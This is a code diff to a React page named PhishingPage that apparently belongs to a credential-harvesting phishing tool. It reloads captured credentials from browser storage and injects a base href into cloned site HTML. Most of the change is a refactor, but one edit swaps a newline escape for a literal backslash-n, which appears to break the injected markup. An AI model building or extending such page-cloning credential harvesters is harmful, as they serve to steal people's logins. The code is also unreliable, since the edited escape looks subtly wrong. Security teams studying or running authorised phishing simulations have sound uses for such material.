@@ -1,7 +1,7 @@
 
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import type { CapturedCredential } from '@/components/credential-harvester';
 import { useToast } from '@/hooks/use-toast';
 import { CredentialHarvester } from '@/components/credential-harvester';
@@ -105,6 +105,16 @@ export default function PhishingPage() {
   });
 
   // Load credentials from storage on initial client render
+  const loadCredentialsFromStorage = () => {
+    try {
+        const storedCreds = localStorage.getItem(storageKey);
+        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
+    } catch (error) {
+        console.error('Failed to load credentials from localStorage', error);
+        setCapturedCredentials([]);
+    }
+  };
+
   useEffect(() => {
     loadCredentialsFromStorage();
   }, []);
@@ -136,16 +146,6 @@ export default function PhishingPage() {
       window.removeEventListener('storage', handleStorageChange);
     };
   }, [capturedCredentials.length, toast]);
-
-  const loadCredentialsFromStorage = () => {
-    try {
-        const storedCreds = localStorage.getItem(storageKey);
-        setCapturedCredentials(storedCreds ? JSON.parse(storedCreds) : []);
-    } catch (error) {
-        console.error('Failed to load credentials from localStorage', error);
-        setCapturedCredentials([]);
-    }
-  };
 
   const handleClearCredentials = () => {
     setCapturedCredentials([]);
@@ -194,7 +194,7 @@ export default function PhishingPage() {
       
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
-          html = html.replace(/<head>/i, `<head>\n<base href="${baseHrefUrl}">`);
+          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
         } else {
           html = `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
